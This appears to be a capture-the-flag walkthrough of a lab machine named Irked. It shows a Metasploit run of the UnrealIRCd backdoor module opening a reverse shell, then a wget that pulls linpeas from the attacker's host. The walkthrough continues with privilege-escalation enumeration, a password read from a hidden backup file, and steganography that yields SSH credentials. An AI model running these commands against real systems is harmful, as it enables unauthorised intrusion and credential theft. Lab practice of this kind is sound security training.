```
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > run
[*] Started reverse TCP double handler on 10.10.14.9:4444 
[*] 10.10.10.117:65534 - Connected to 10.10.10.117:65534...
    :irked.htb NOTICE AUTH :*** Looking up your hostname...
[*] 10.10.10.117:65534 - Sending backdoor command...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo Bg2SZhar1c6pAwIS;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket A
[*] A: "Bg2SZhar1c6pAwIS\r\n"
[*] Matching...
[*] B is input...
[*] Command shell session 1 opened (10.10.14.9:4444 -> 10.10.10.117:37295) at 2025-09-06 11:39:47 -0600

whoami
ircd
id
uid=1001(ircd) gid=1001(ircd) groups=1001(ircd)

```

## Linpeas
```
pwd
/dev/shm
wget http://10.10.14.9:1337/linpeas.sh
--2025-09-06 14:03:54--  http://10.10.14.9:1337/linpeas.sh
Connecting to 10.10.14.9:1337... connected.
HTTP request sent, awaiting response... 200 OK
Length: 956174 (934K) [text/x-sh]
Saving to: ������linpeas.sh������

<SNIP>

2025-09-06 14:03:54 (2.12 MB/s) - ������linpeas.sh������ saved [956174/956174]

ls
linpeas.sh
pulse-shm-1653320211
pulse-shm-1790142066
pulse-shm-3686493256
pulse-shm-926736884

```

## Snippets
```
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable

╔══════════╣ SGID
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid

-rwsr-sr-x 1 daemon daemon 50K Sep 30  2014 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)

╔══════════╣ Files inside others home (limit 20)
/home/djmardov/.profile
/home/djmardov/Documents/.backup

cat /home/dj*/Doc*/.backup
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
```

# steghide decryption
https://futureboy.us/stegano/decinput.html
Uploaded irked.jpg
Provided `UPupDOWNdownLRlrBAbaSSss` as a password
Output:  `Kab6h+m+bbp2J:HG`

These credentials are valid for djmardov to SSH